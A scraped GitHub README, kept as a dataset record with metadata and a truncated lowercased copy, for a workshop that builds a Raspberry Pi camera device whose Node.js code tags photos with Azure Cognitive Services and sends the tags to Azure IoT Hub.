you'd need a dongle.\nYou'll also need some software on your host machine. This will get you started...\nVisual Studio Code\nNode v4+\nGit\nBonjour for Windows\nBuilding the Circuit\nEven basic electronic circuits can be intimidating if you - like many software devs - haven't worked with them before. The circuit for this project is very simple, and will hopefully give you some confidence.\nThe easiest way to direct you in putting this circuit together is to show you a breadboard diagram. Your kit has all of the components and the right number and type of jumper wires. Just follow the image below and note the following...\nIn case you've never used a breadboard, what you have in your kit is a mini-breadboard. These are simpler and smaller than normal breadboards. On these boards, the columns (each with 5 holes) are connected internally, so components you plug in will be connected to each other but isolated from anything plugged in to another column.\nThe 40 pins from the Raspberry Pi input/output header is displayed and the direction of the USB ports is labeled for orientation.\nThe cylinder shaped components with colored lines are resistors. It doesn't matter which direction they go\nThe resistors have different values, so do make sure to look at the color bands and use the correct one\nThe button has four legs, because it could actually be used in two circuits simultaneously, but here we're just using it for a single circuit. When you put it in the board, the small latches should be on the sides as opposed to the top and bottom.\nThe direction you put the LED in does matter. The longer leg is on the left.\nYou can test that you have your LED in right by temporarily connecting the positive side (the leg of the resistor on the left that's connected to the LED's longer leg) to the positive (red) bus.\nAdditionally, there's a Raspberry Pi camera module in your kit. That camera is made especially for the Raspberry Pi. Of course, you could just plug a webcam into one of the 4 USB ports of the device, but the camera with the ribbon cable is plugging in to the camera's CSI bus and that makes it faster.\nThe camera in this kit is only 5 megapixels (to keep the cost low), but you can get higher quality cameras as well as cameras with IR lights to see at night!\nTo plug your camera connect in to your Raspberry Pi device, you use the onboard camera slot (not to be confused with the nearly identical display port!). You pull up on the plastic sleeve, insert the camera's ribbon cable with the blue side facing the USB ports, and then push down on the sleeve to secure it.\nInstalling Raspbian\nInstalling an operating system on an IoT device is not hard, but it does take a bit of time.\nWe're going to be using Linux for this workshop, but you should know that Windows 10 IoT Core is an option too. Among its strengths, Windows 10 enables of a lot of code reuse between apps on the IoT device and apps running on other Windows platforms. If you want to install Windows 10 IoT Core, go to windowsondevices.com to learn how.\nLike I said though, we're going to be using Linux. Although it's possible to run various distributions on a RP3, Raspbian works great. You can choose the full version or you can go with the Lite edition. The full version of Raspbian gives you the GUI desktop and a lot of apps, services, and drivers. The Lite version is best for a simple command line instance of Raspbian without all the cruft. For either one, go to Raspberry Pi's download page. The devices we're using today are using Raspbian Lite.\nAfter you've downloaded an image, follow the instructions on raspberrypi.org to get it installed on your device.\nConnecting to the Device\nIf you have an HDMI monitor, keyboard, and mouse available, you can plug them in to your device and use it like any other computer.\nI recommend learning how to access your pi directly over a network connection and a command line, though.\nTo connect without a monitor, you take advantage of the fact that Raspbian comes with mDNS enabled. That means that your device is broadcasting its presence from the very first boot. To see it, you need mDNS software. If you're on a Mac, Bonjour is built in. If you're on Windows, I've found a quick install of Bonjour Print Services to be the easiest way. If you're on Linux, you can use Avahi, but I haven't done that before.\nAfter you're host machine is mDNS enabled, just plug your device into your host machine using an ethernet cable, and then just ping your device using ping <device name>.local. When you pull a pi out of its box, its name is raspberrypi, so you would do ping raspberrypi.local. That's going to give you the IP address of the device. If it's a IPv6 address, you can request a v4 address using ping raspberrypi.local -4.\nYou can either use the newly discovered IP address to connect to your device, or you can continue using its mDNS name.\nConnecting using SSH\nThe first thing to do is connect remotely to your device, and SSH is the tool for the job.\nYou need to have ssh available on your command line. You can simply type ssh and then hit enter to see if you do. If you don't, you can use one of these strategies for getting it...\nAdd the /usr/bin folder from your Git installation to your path. This is the simplest method. Simply go to your machine's environment variables, edit the path, and add the folder. Mine is at c:\\Program Files\\Git\\usr\\bin. Once you do this (and restart your terminal), you'll have ssh and a bunch of other utilities at your fingertips.\nInstall PuTTY (Windows). The PuTTY application includes both a visual tool and a command line tool for remoting via SSH.\nOnce you have ssh installed, remoting to your device is as simply as ssh pi@raspberrypi.local.\nConfiguring WiFi Networks\nWhen you first set up a device, it doesn't know what your wireless networks are called or what your passwords are. You have to configure that. Once you do, you don't need to rely on the ethernet cable any more. Here's how to configure the networks...\nInitiate a remote connection to the device using...\nssh pi@raspberrypi.local\nWhen prompted for the password use raspberry\nEdit the wireless config file using...\nsudo nano /etc/wpa_supplicant/wpa_supplicant.conf\nAdd one to many networks to the bottom of the file using the format...\nnetwork={\nssid=\"<ssid>\"\npsk=\"<password>\"\n}\nIf you want, you can add another property to multiple networks called priority to determine the order in which networks will be attempted. Higher numbers are tried first. That looks like this...\nnetwork={\nssid=\"MyNetwork\"\npsk=\"pa$$w0rd\"\npriority=99\n}\nNow remove the ethernet cable and reboot your device with sudo reboot now. You can always run wpa_cli status to see if you're connected, and you can ping codefoster.com to be sure.\nConfiguring the Device\nThere are a couple of things you need to do when you first get your device installed and get connected.\nMost of the configuration options are found in a utility called raspi-config. To run it, use sudo raspi-config. I recommend checking to local to be sure it's configured for your area. It's configured for en-GB out of the box. You should also enable the camera. If you'd like, you can also go to the Advanced Options and change your hostname... especially if you're going to be using your pi on the same network with others. Otherwise, they're all called raspberrypi and it can get confusing.\nInstalling Node on the Device\nJavaScript via Node.js is just one of the languages you can write on a Raspberry Pi, but if you ask me it's the most exciting one.\nThere are a variety of ways to install Node on a Raspberry Pi, but the best way in my opinion is to use nvs. The instructions are at https://github.com/jasongin/nvs and provide you 3 simple steps on your Pi...\nexport NVS_HOME=\"$HOME/.nvs\"\ngit clone https://github.com/jasongin/nvs \"$NVS_HOME\"\n. \"$NVS_HOME/nvs.sh\" install\nOnce that's done, getting the latest version of Node is as easy as...\nnvs add latest\nnvs use latest\nNow see what version of node and npm you have by doing...\nnode -v\nnpm -v\nIoT Hub Discussion and Setup\nAzure IoT Hub is sort of the center of it all. You can have millions of extremely chatty devices talking to one IoT Hub without a problem, and then you can do all sorts of fun things with those messages on the backend. The IoT Hub service is in the cloud and needs to be created in Azure before we can write code to talk to it.\nCreating our IoT Hub\nWe'll walk through the creation of an IoT Hub. This step too is very easy, but you will need an Azure subscription. If you don't have one already, go to azure.com and click to start the free trial.\nTo create our hub, we'll start by creating a Resource Group. A Resource Group is a logical group of resources that often represent a single solution and are likely deployed together, managed together, and deleted together. I called mine iot-workshop, but you can call yours whatever you want.\nNext, we'll hit the plus button above the Resources list in our Resource Group (RG) and search to find the IoT Hub resource. That will bring us to this short form to fill out.\nAnd that's it!\nRegistering a Device\nWe have a hub, but there has to be an explicit registration for every device that checks in to it. That's so that unauthorized code is unable to act like one of our devices and send spoofed messages.\nThe easiest way to register a device is to simply use the Device Explorer in the Azure portal. You simply navigate to your hub, click the Device Explorer on the left, and then click Add.\nOnce you have registered a device, the important bit of information is that device's connection string. You'll be pasting that into your code.\nCognitive Services\nMicrosoft Cognitive Services is also in Azure and needs to be set up before we write the calling code.\nCognitive Services is great because it's very powerful and very easy to use. That's a good combination.\nCognitive Services is essentially a whole bunch of very complicated machine learning happening for you through a very easy to call API.\nWith it you can do things like detect what objects are in an image, validate that the person speaking to the computer is who they say they are, turn text into speech or speech into text, perform optical character recognition (OCR), and a ton more.\nWe're going to play around with the various services so you understand what all is possible, and youc an do the same thing at microsoft.com/cognitive.\nWhile you're on that site, you can click Get started for free to get your own API keys for calling these services.\nIn order to access Cognitive Services without resorting to low-level REST calls, we'll use the http://npmjs.com/package/project-oxford node module. It will be a cinch.\nEnvironment Variables\nConnecting to IoT Hub and Cognitive Services require some specific strings - a connection string for IoT Hub and a key for Cognitive Services. It's nice to store those keys in environment variables to keep them from being hard coded.\nThe easiest way to do this in my opinion is to add them to your .profile...\nEdit your .profile by executing sudo nano ~/.profile\nAt the very end of the file, add the following...\nexport COGNITIVE_SERVICES_KEY=\"<key>\"\nexport DEVICE_CONN_STRING=\"<connection string>\"\nRemember that just editing the .profile file doesn't actually execute it immediately. It just sets what gets executed at boot. So run your profile once by also executing . ~/.profile.\nWriting the Device Code\nNow we need to write some code to send to our RP3. First we need to set up our project, and then we'll write the code by following these steps...\nConnecting to the RP3's GPIO system\nConnecting to Our IoT Hub\nTaking a Picture\nAnalyzing the Image with Cognitive Services\nSending the Results to IoT Hub\nDifferent IoT devices are capable of running different kinds of code. Lower level devices force you to write a very constrained version of C. Some run C# or Python or JavaScript. The latter choices are nice because you can work with the same kind of code on your host machine as on your device.\nTheoretically it would be possible to even run the same code on both, except that devices tend to have a number of hardware interfaces (the GPIO pins for instance) that our host machines don't have.\nWe'll write the code on our host machine, and then copy it to the device.\nSetting Up the Project\nLet's start by getting our project setup...\nMake yourself a new folder wherever you want on your machine called iot-workshop\nIn that folder create another folder called device\nOn your command line go to that device folder and run npm init -y (that will create a package.json file for you)\nCreate a file called index.js and that's where we'll put our code\nFinally, open the project using Visual Studio Code by simply typing code . on the command line\nPasting in the Code\nI'm going to drop the entirety of the code here for you to copy, and then I'll just describe what it does.\nrun();\nasync function run() {\nlog('establishing connection to gpio...');\nlet five = await readyBoard();\nlet led = new five.Led('GPIO26');\nlet button = new five.Button('GPIO20');\nlog('connecting to iot hub...');\nlet hubClient = await connectToIoTHub();\nled.stop().off();\nlog('READY');\nbutton.on('press', async () => {\nled.blink(500);\nlog('taking a picture...');\nawait takePicture('picture.png');\nlog(`analyzing image...`);\nlet tags = await analyzeImage('picture.png');\nawait deleteImage('picture.png');\nlog('sending message to iot hub...');\nawait sendMessage(hubClient, JSON.stringify(tags));\nlog(`Sent ${JSON.stringify(tags)} to your IoT Hub`);\nled.stop().off();\nlog('READY');\n})\n}\nfunction readyBoard() {\nreturn new Promise((resolve, reject) => {\nlet five = require('johnny-five');\nlet raspi = require('raspi-io');\nlet board = new five.Board({ io: new raspi() });\nboard.on('ready', () => {\nresolve(five);\n});\n});\n}\nfunction connectToIoTHub() {\nreturn new Promise((resolve, reject) => {\nlet deviceAmqp = require('azure-iot-device-amqp');\nlet connectionString = process.env.DEVICE_CONN_STRING;\nlet client = deviceAmqp.clientFromConnectionString(connectionString);\nclient.open(err => {\nif (err) reject(err);\nresolve(client);\n});\n})\n}\nfunction takePicture() {\nreturn new Promise((resolve, reject) => {\nlet Camera = require('camerapi');\nlet cam = new Camera();\ncam.baseFolder('.');\ncam.takePicture('picture.png', (file, error) => {\nif (error) reject(error);\nresolve(file);\n});\n});\n}\nfunction analyzeImage(image) {\nlet oxford = require('project-oxford');\nlet cogClient = new oxford.Client(process.env.COGNITIVE_SERVICES_KEY);\nreturn cogClient.vision.analyzeImage({ path: image, Tags: true })\n.then(result => result.tags);\n}\nfunction deleteImage(image) {\nreturn new Promise((resolve, reject) => {\nlet fs = require('fs');\nfs.unlink(image, (err) => {\nif (err) reject(err);\nresolve();\n});\n});\n}\nfunction sendMessage(client, content) {\nreturn new Promise((resolve, reject) => {\nlet device = require('azure-iot-device');\nlet message = new device.Message(content);\nclient.sendEvent(message, (err, res) => {\nif (err) reject(err);\nresolve(res);\n});\n});\n}\nfunction log(msg) {\nconsole.log(msg);\n}\nAdding Package dependencies\nThroughout this code, there are a number of dependencies that are used. They all use the require('<packagename>') syntax.\nSome of these dependencies can be installed on the host machine, but not all of them. The raspi-io and camerapi packages are expecting to be on an actual device and will fail otherwise.\nSo, let's just add the dependencies directly to the package.json file. That way, when we deploy our code to the device and run npm install it will install them on the device.\nTo do this, simply paste the following into your package.json file...\n\"dependencies\": {\n\"@types/johnny-five\": \"0.0.29\",\n\"@types/node\": \"^6.0.45\",\n\"@types/project-oxford\": \"^0.1.29\",\n\"azure-iot-device\": \"^1.0.15\",\n\"azure-iot-device-amqp\": \"^1.0.15\",\n\"camerapi\": \"^0.1.0\",\n\"johnny-five\": \"^0.10.3\",\n\"project-oxford\": \"^1.5.0\",\n\"raspi-io\": \"^6.1.0\"\n},\nTip In VS Code, you can hit ctrl+space when your cursor is on the version and it will autocomplete the most current version. You can even autocomplete the package names!\nJust to be clear on why we did this. When we deploy our app out to the device, we'll send this package.json file along as well. It contains information about all of the dependencies needed by the project, and makes it easy to install all dependencies at once.\nAsynchronous Steps\nYou'll notice that this code uses the async/await pattern to call a number of functions and orchestrate the results rather elegantly. The async/await pattern works with existing JavaScript promises, so you'll notice that each of the functions returns a promise and gives us a chance to determine when that promise resolves.\nStep 1. Readying the Board\nFirst, we have to get on speaking terms with the GPIO pins on our Raspberry Pi.\nEvery IoT device implements its IO pins differently, but in most cases there are libraries already mapped to the language you want to code in. For the Raspberry Pi, check out my article to see specifically how it works.\nWhat we want is a high level library that takes away all of the ceremony for us and lets us be expressive about what we're trying to do. That's where Johnny Five comes in.\nJohnny Five is a JavaScript library for working with devices. It is very popular and supports a ton of devices and hardware sensors. Furthermore, any code you write in Johnny Five is easy to port to another device type.\nLook at readyBoard function in index.js and notice that we resolve the promise as soon as Johnny Five reports that everything has been setup correctly.\nStep 2. Connecting to Our IoT Hub\nNow, have a look at the connectToIoTHub function, and note that this function call won't happen until after the board is ready. That's the beauty of await.\nTo connect to the IoT Hub, we need the azure-iot-device and azure-iot-device-amqp packages that we installed.\nazure-iot-device is a generic module for Azure IoT device code, and the second is specific to whatever IoT protocol we choose. We're choosing to use AMQP here.\nThen, we drop our connection string in. Note that this is not the \"IoT Hub\" connection string. This is the \"device connection string\".\nYou can get this by using the IoT Hub Explorer utility again. Just do...\niothub-explorer list --connection-string\nThen we use that connection string we added to our .profile to create our IoT Hub client. Here's the line I'm referring to...\nlet hubClient = deviceAmqp.clientFromConnectionString(process.env.DEVICE_CONN_STRING);\nIn Node.js, environment variables are available under process.env.\nIf the connection doesn't open, the promise will be rejected and a top level exception will be thrown. That's exactly the behavior we want.\nStep 3. Taking a Picture\nNow, take a look at the takePicture function.\nIf you're on the command line of the Raspberry Pi, you use the raspicam utility to take a photo or video. We, however, are not on the command line - we're in Node.js. In that case, you use a module to wrap that call to raspicam. The module I chose is called camerapi.\nTo take a picture, we instantiate a new camera, set its base folder (where pictures are saved) to the current directory, and then take a picture. Here's the code...\nlet cam = new Camera();\ncam.baseFolder('.');\ncam.takePicture('picture.png', (file,error) => {\n...\n});\nThat was pretty easy. When the program is run, after the board is ready and after a connection to the IoT Hub is established, that code will be executed and a single picture will be taken and saved as picture.png in the same directory where our code is.\nNow let's send that image to Microsoft Cognitive Services to see what's in it.\nStep 4. Analyzing the Image with Cognitive Services\nNow, take a look at the analyzeImage function.\n\"Project Oxford\" was the code name for Microsoft Cognitive Services, and the project-oxford module is a Node.js SDK for accessing it.\nNow it's time to use that Cognitive Services key we set as an environment variable earlier. It should be available at process.env.COGNITIVE_SERVICES_KEY.\nNow to actually use the service to analyze an image. Here's the code...\nreturn cogClient.vision.analyzeImage({ path: image, Tags: true })\n.then(result => result.tags);\nThat calls the analyzeImage() method passing it the name of the picture that we just took. We also tell the API that we're interested in the tags by adding Tags: true.\nInstead of using a callback, this SDK uses promises (nice!), so the function we pass to the .then() method is what happens after the response comes back from the service. Since we're wanting to return a promise too, we can simply return the results of the analyzeImage() call.\nHere we're taking the result as is, but there's a good chance you would want to do some conditioning on that object here. We also delete the picture so we're ready for the next one.\nNext we need to get that result up to an IoT Hub so we can do all kinds of cloud magic to it.\nStep 5. Sending the Results to IoT Hub\nAnd finally, we want to send a message to the IoT Hub every time an image is successfully analyzed. Have a look at the sendMessage function.\nlet device = require('azure-iot-device');\nlet message = new device.Message(content);\nclient.sendEvent(message, (err, res) => {\nif (err) reject(err);\nresolve(res);\n});\nThis will create an IoT Hub message using the content we pass in, send it, and handle some error cases for us. If there are no errors then it will give us a little message on the console.\nThat brings us to code completion! You can check out the file directly if that helps. Now we just need to get your beautiful code down to your Raspberry Pi!\nDeploying to the Device\nThere are many ways to deploy application code to an IoT device, but there's nothing quite as raw as simply copying the files directly over the network.\nFor this we need scp.\nThere are a number of files in our project now, but there are really only two that we need on our device: index.js and package.json. The package.json file is important, because it contains the list of dependencies our project has that we'll need to restore.\nFirst, let's create a folder on the device to hold our project files. At your command line in your code folder, run this statement (you'll need your password)...\nssh <username>@<device name>.local 'mkdir device'\nCalling ssh with the username@host as well as a command (i.e. 'mkdir device') issues that command on the remote device. It's a pretty handy way to fire off a command on a remote machine without the trouble of connecting, commanding, and then disconnecting.\nNow run this one to copy these two files to the device...\nscp index.js package.json <username>@<device name>.local:~/device\nThe files are out there and ready to run. I think the easiest way to run them is to open a second console window and ssh in directly to the device. Use...\nssh <username>@<device name>.local\nNote that this command is just the ssh and the username@host so it doesn't fire a command, but rather just starts a remote session.\nAfter your first code deployment, you'll need to restore dependencies. You can do that (once you're ssh'ed to the device) by using...\nnpm install\nNow it's time to go get some coffee, because that command is going to take considerable time. There's a lot going on in the raspi-io library.\nAnd now (still ssh'ed to the device) you can run your application. Normally, you run a node application using something like node ., but on a Raspberry Pi, it's a bit tricky. You see, your code is not allowed to access the GPIO pins unless you use sudo. But then if you use environment variables, using sudo doesn't respect them. Additionally, if you used nvs to install node like I suggested, then sudo node doesn't work because it doesn't see the node command. To resolve all of this at once, just execute...\nsudo -E $(which node) .\nThe -E instructs sudo to keep your environment variables. $(which node) finds the exact location of the node command and sends that. Finally, . means \"this folder\". Node is smart enough to look for an index.js file in the current folder and run that.\nIf all went as planned, your code shoudl be running, and you should se \"READY\". To test it, push the button and see what happens!\nOne more note here. I hooked some timing up to this code and discovered that it takes a full 6s to take the picture. I'm not sure why it takes that long. The entire process takes close to 10s on my machine, where the vast majority of the rest of the time is spent sending the image to the cloud and analyzing it. Sending a message to IoT Hub takes very little time. The message is small and the AMQP protocol is a very efficient one.\nThat's great and all, but perhaps we want to see what messages are landing in our hub. For that we would write a simple service to monitor hub messages. We can write and run this service on our host machine. It doesn't have to be running in Azure or on the device.\nWriting the Hub Listener Code\nWe'll write one more Node project, connect it to our IoT Hub, and simply report to the console whenever we see messages appear in the hub.\nThe only real reason for this part is to show you how you would write a custom service that responds to messages as they arrive in the cloud. Actually, there's a decent chance you won't even need a custom service since you can wire up IoT Hub to a number of other Azure services with configuration alone. But just in case.\nFollow these steps on your host machine...\nin the iot-workshop folder that you created earlier, create another folder called hublistener.\nin that hublistener folder on your command line run npm init -y. That creates the package.json file.\nrun npm install azure-event-hubs --save\ncreate an index.js file\nNow edit that index.js file (to open the project in code, just type code .)\nHere are the file contents...\n//index.js\nlet eh = require('azure-event-hubs');\nvar hubClient = eh.Client.fromConnectionString(process.env.HUB_CONNECTION_STRING);\nhubClient.open()\n.then(hubClient.getPartitionIds.bind(hubClient))\n.then(pids =>\npids.map(pid =>\nhubClient.createReceiver('$Default', pid, { 'startAfterTime': Date.now() })\n.then(receiver => {\nconsole.log('Created partition receiver: ' + pid)\nreceiver.on('errorReceived', err => console.log(err.message));\nreceiver.on('message', m => console.log(JSON.stringify(m.body)));\n})\n)\n)\n.catch(err => console.log(err.message));\nThat first line imports the azure-event-hubs package. I haven't mentioned this yet, but IoT Hub is implemented with an Azure Event Hub, and every IoT Hub has an Event Hub endpoint. That means that an IoT Hub can act like an Event Hub. We're using the azure-event-hub package here because we only want to read from hub and are not actually going to be sending any cloud-to-device (C2D) messages.\nWe start with the connection string. This is the IoT Hub connection string (as opposed to the device connection string), and we discover by navigating to our IoT Hub in our Azure portal and looking at the \"Shared access policies\" section. We'll choose the service policy, and then copy the primary connection string.\nOnce we've created the hubClient we call open() and then (this uses the promise pattern) we get the partition IDs (we may have configured our hub to use any number of partitions between 2 and 32 or even more), and then we create a receiver for each partition, and then we tie up some event handlers for that receiver including what to do when it sees a message. In that case, we simply log it to the console.\nWe can run this (on our host machine) using node . at the command line in the hublistener folder. You'll see the messages that it's connecting and creating partition receivers, and then if you go send a message from your device, you should see it in the hublistener. Very cool!\nWe're successfully sending messages to the cloud, but now what? We're slowly collecting data about everything a camera sees, and now we would likely want to do something in the cloud with that data. Maybe we want to report it with some graphs. Maybe we want to create an alert for any time a certain thing is spotted. Maybe we want to send an email whenever the incident count of a certain object is seen a certain number of times.\nOh, the possibilities are endless!", "link": "https://github.com/codefoster/iot-workshop", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "instructions\nobjective\nthis workshop will walk you through a few common iot scenarios like basic user input (a button), output (an led), a camera, a web service call (microsoft cognitive services vision api), and finally an iot ingestion service (azure iot hub). we'll use node.js as the device language.\nwhen it's all finished and working, with the click of a button you'll be able to take a picture, figure out what objects are in the picture, and then record the result in a cloud service.\nwhat is iot\nthe internet of things (iot) is a hot topic. it's also a rather broad topic, and iot topics often cover a few disciplines...\nmaterial design (wood, plastic, metal)\nelectronics\nsoftware\ncloud services\nwe won't do any material design in this project, but we'll put tother an electronic circuit, write some software, and consume some cloud services to create a fun, final solution.\ntaking inventory\nhere's what you'll need in order to complete this tutorial...\nraspberry pi 3\nraspberry pi camera module\nmicro sd card\nelectronics\nbreadboard\n4 m/f jumper wires\n2 m/m jumper wires\nmomentary no (normally open) button\nled\n330 \u03c9 resistor\n10 k\u03c9 resistor\nusb power cord\nethernet cable\nthe raspberry pi 3 (rp3) is obviously the brains of the operation here. it's essentially a tiny computer with controllable pins. we've equipped these ones with a raspberry pi camera module too. of course, you could just plug a webcam in to one of the usb ports, but the camera module uses the csi port on the board and is faster and has drivers built in to the device.\nthe rp3 doesn't have any built in storage, but uses a micro sd card slot. we have raspbian - raspberry pi's custom distribution of linux - installed along with node.js. this makes each of these devices a very capable machine.\nthe rp3 is powered with a standard micro usb port.\nfor network connectivity, the rp3 has wifi built right in. this should already be set up for you.\nbtw, there's nothing stopping you from doing this same project with a raspberry pi 2. it down't have built-in wifi, though, so you'd need a dongle.\nyou'll also need some software on your host machine. this will get you started...\nvisual studio code\nnode v4+\ngit\nbonjour for windows\nbuilding the circuit\neven basic electronic circuits can be intimidating if you - like many software devs - haven't worked with them before. the circuit for this project is very simple, and will hopefully give you some confidence.\nthe easiest way to direct you in putting this circuit together is to show you a breadboard diagram. your kit has all of the components and the right number and type of jumper wires. just follow the image below and note the following...\nin case you've never used a breadboard, what you have in your kit is a mini-breadboard. these are simpler and smaller than normal breadboards. on these boards, the columns (each with 5 holes) are connected internally, so components you plug in will be connected to each other but isolated from anything plugged in to another column.\nthe 40 pins from the raspberry pi input/output header is displayed and the direction of the usb ports is labeled for orientation.\nthe cylinder shaped components with colored lines are resistors. it doesn't matter which direction they go\nthe resistors have different values, so do make sure to look at the color bands and use the correct one\nthe button has four legs, because it could actually be used in two circuits simultaneously, but here we're just using it for a single circuit. when you put it in the board, the small latches should be on the sides as opposed to the top and bottom.\nthe direction you put the led in does matter. the longer leg is on the left.\nyou can test that you have your led in right by temporarily connecting the positive side (the leg of the resistor on the left that's connected to the led's longer leg) to the positive (red) bus.\nadditionally, there's a raspberry pi camera module in your kit. that camera is made especially for the raspberry pi. of course, you could just plug a webcam into one of the 4 usb ports of the device, but the camera with the ribbon cable is plugging in to the camera's csi bus and that makes it faster.\nthe camera in this kit is only 5 megapixels (to keep the cost low), but you can get higher quality cameras as well as cameras with ir lights to see at night!\nto plug your camera connect in to your raspberry pi device, you use the onboard camera slot (not to be confused with the nearly identical display port!). you pull up on the plastic sleeve, insert the camera's ribbon cable with the blue side facing the usb ports, and then push down on the sleeve to secure it.\ninstalling raspbian\ninstalling an operating system on an iot device is not hard, but it does take a bit of time.\nwe're going to be using linux for this workshop, but you should know that windows 10 iot core is an option too. among its strengths, windows 10 enables of a lot of code reuse between apps on the iot device and apps running on other windows platforms. if you want to install windows 10 iot core, go to windowsondevices.com to learn how.\nlike i said though, we're going to be using linux. although it's possible to run various distributions on a rp3, raspbian works great. you can choose the full version or you can go with the lite edition. the full version of raspbian gives you the gui desktop and a lot of apps, services, and drivers. the lite version is best for a simple command line instance of raspbian without all the cruft. for either one, go to raspberry pi's download page. the devices we're using today are using raspbian lite.\nafter you've downloaded an image, follow the instructions on raspberrypi.org to get it installed on your device.\nconnecting to the device\nif you have an hdmi monitor, keyboard, and mouse available, you can plug them in to your device and use it like any other computer.\ni recommend learning how to access your pi directly over a network connection and a command line, though.\nto connect without a monitor, you take advantage of the fact that raspbian comes with mdns enabled. that means that your device is broadcasting its presence from the very first boot. to see it, you need mdns software. if you're on a mac, bonjour is built in. if you're on windows, i've found a quick install of bonjour print services to be the easiest way. if you're on linux, you can use avahi, but i haven't done that before.\nafter you're host machine is mdns enabled, just plug your device into your host machine using an ethernet cable, and then just ping your device using ping <device name>.local. when you pull a pi out of its box, its name is raspberrypi, so you would do ping raspberrypi.local. that's going to give you the ip address of the device. if it's a ipv6 address, you can request a v4 address using ping raspberrypi.local -4.\nyou can either use the newly discovered ip address to connect to your device, or you can continue using its mdns name.\nconnecting using ssh\nthe first thing to do is connect remotely to your device, and ssh is the -----> tool !!!  for the job.\nyou need to have ssh available on your command line. you can simply type ssh and then hit enter to see if you do. if you don't, you can use one of these strategies for getting it...\nadd the /usr/bin folder from your git installation to your path. this is the simplest method. simply go to your machine's environment variables, edit the path, and add the folder. mine is at c:\\program files\\git\\usr\\bin. once you do this (and restart your terminal), you'll have ssh and a bunch of other utilities at your fingertips.\ninstall putty (windows). the putty application includes both a visual tool and a command line tool for remoting via ssh.\nonce you have ssh installed, remoting to your device is as simply as ssh pi@raspberrypi.local.\nconfiguring wifi networks\nwhen you first set up a device, it doesn't know what your wireless networks are called or what your passwords are. you have to configure that. once you do, you don't need to rely on the ethernet cable any more. here's how to configure the networks...\ninitiate a remote connection to the device using...\nssh pi@raspberrypi.local\nwhen prompted for the password use raspberry\nedit the wireless config file using...\nsudo nano /etc/wpa_supplicant/wpa_supplicant.conf\nadd one to many networks to the bottom of the file using the format...\nnetwork={\nssid=\"<ssid>\"\npsk=\"<password>\"\n}\nif you want, you can add another property to multiple networks called priority to determine the order in which networks will be attempted. higher numbers are tried first. that looks like this...\nnetwork={\nssid=\"mynetwork\"\npsk=\"pa$$w0rd\"\npriority=99\n}\nnow remove the ethernet cable and reboot your device with sudo reboot now. you can always run wpa_cli status to see if you're connected, and you can ping codefoster.com to be sure.\nconfiguring the device\nthere are a couple of things you need to do when you first get your device installed and get connected.\nmost of the configuration options are found in a utility called raspi-config. to run it, use sudo raspi-config. i recommend checking to local to be sure it's configured for your area. it's configured for en-gb out of the box. you should also enable the camera. if you'd like, you can also go to the advanced options and change your hostname... especially if you're going to be using your pi on the same network with others. otherwise, they're all called raspberrypi and it can get confusing.\ninstalling node on the device\njavascript via node.js is just one of the languages you can write on a raspberry pi, but if you ask me it's the most exciting one.\nthere are a variety of ways to install node on a raspberry pi, but the best way in my opinion is to use nvs. the instructions are at https://github.com/jasongin/nvs and provide you 3 simple steps on your pi...\nexport nvs_home=\"$home/.nvs\"\ngit clone https://github.com/jasongin/nvs \"$nvs_home\"\n. \"$nvs_home/nvs.sh\" install\nonce that's done, getting the latest version of node is as easy as...\nnvs add latest\nnvs use latest\nnow see what version of node and npm you have by doing...\nnode -v\nnpm -v\niot hub discussion and setup\nazure iot hub is sort of the center of it all. you can have millions of extremely chatty devices talking to one iot hub without a problem, and then you can do all sorts of fun things with those messages on the backend. the iot hub service is in the cloud and needs to be created in azure before we can write code to talk to it.\ncreating our iot hub\nwe'll walk through the creation of an iot hub. this step too is very easy, but you will need an azure subscription. if you don't have one already, go to azure.com and click to start the free trial.\nto create our hub, we'll start by creating a resource group. a resource group is a logical group of resources that often represent a single solution and are likely deployed together, managed together, and deleted together. i called mine iot-workshop, but you can call yours whatever you want.\nnext, we'll hit the plus button above the resources list in our resource group (rg) and search to find the iot hub resource. that will bring us to this short form to fill out.\nand that's it!\nregistering a device\nwe have a hub, but there has to be an explicit registration for every device that checks in to it. that's so that unauthorized code is unable to act like one of our devices and send spoofed messages.\nthe easiest way to register a device is to simply use the device explorer in the azure portal. you simply navigate to your hub, click the device explorer on the left, and then click add.\nonce you have registered a device, the important bit of information is that device's connection string. you'll be pasting that into your code.\ncognitive services\nmicrosoft cognitive services is also in azure and needs to be set up before we write the calling code.\ncognitive services is great because it's very powerful and very easy to use. that's a good combination.\ncognitive services is essentially a whole bunch of very complicated machine learning happening for you through a very easy to call api.\nwith it you can do things like detect what objects are in an image, validate that the person speaking to the computer is who they say they are, turn text into speech or speech into text, perform optical character recognition (ocr), and a ton more.\nwe're going to play around with the various services so you understand what all is possible, and youc an do the same thing at microsoft.com/cognitive.\nwhile you're on that site, you can click get started for free to get your own api keys for calling these services.\nin order to access cognitive services without resorting to low-level rest calls, we'll use the http://npmjs.com/package/project-oxford node module. it will be a cinch.\nenvironment variables\nconnecting to iot hub and cognitive services require some specific strings - a connection string for iot hub and a key for cognitive services. it's nice to store those keys in environment variables to keep them from being hard coded.\nthe easiest way to do this in my opinion is to add them to your .profile...\nedit your .profile by executing sudo nano ~/.profile\nat the very end of the file, add the following...\nexport cognitive_services_key=\"<key>\"\nexport device_conn_string=\"<connection string>\"\nremember that just editing the .profile file doesn't actually execute it immediately. it just sets what gets executed at boot. so run your profile once by also executing . ~/.profile.\nwriting the device code\nnow we need to write some code to send to our rp3. first we need to set up our project, and then we'll write the code by following these steps...\nconnecting to the rp3's gpio system\nconnecting to our iot hub\ntaking a picture\nanalyzing the image with cognitive services\nsending the results to iot hub\ndifferent iot devices are capable of running different kinds of code. lower level devices force you to write a very constrained version of c. some run c# or python or javascript. the latter choices are nice because you can work with the same kind of code on your host machine as on your device.\ntheoretically it would be possible to even run the same code on both, except that devices tend to have a number of hardware interfaces (the gpio pins for instance) that our host machines don't have.\nwe'll write the code on our host machine, and then copy it to the device.\nsetting up the project\nlet's start by getting our project setup...\nmake yourself a new folder wherever you want on your machine called iot-workshop\nin that folder create another folder called device\non your command line go to that device folder and run npm init -y (that will create a package.json file for you)\ncreate a file called index.js and that's where we'll put our code\nfinally, open the project using visual studio code by simply typing code . on the command line\npasting in the code\ni'm going to drop the entirety of the code here for you to copy, and then i'll just describe what it does.\nrun();\nasync function run() {\nlog('establishing connection to gpio...');\nlet five = await readyboard();\nlet led = new five.led('gpio26');\nlet button = new five.button('gpio20');\nlog('connecting to iot hub...');\nlet hubclient = await 